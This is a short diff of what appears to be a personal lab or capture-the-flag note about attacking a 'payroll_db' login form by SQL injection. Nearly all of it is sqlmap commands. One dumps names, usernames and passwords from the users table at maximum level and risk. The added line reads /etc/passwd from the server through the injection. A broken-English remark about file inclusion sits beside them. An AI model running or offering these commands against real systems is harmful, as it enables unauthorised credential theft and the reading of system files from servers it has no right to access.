@@ -3,6 +3,7 @@
 we can't perform sql injection file inlcude after become parameter
 
 sqlmap -r login.req --batch -D payroll_db -T users -C name,username,password --dump  --technique=BEU --level 5 --risk 3
+sqlmap -r login.req --batch -D payroll_db  --technique=BEU --level 5 --risk 3 --file-read /etc/passwd 
 
 
 
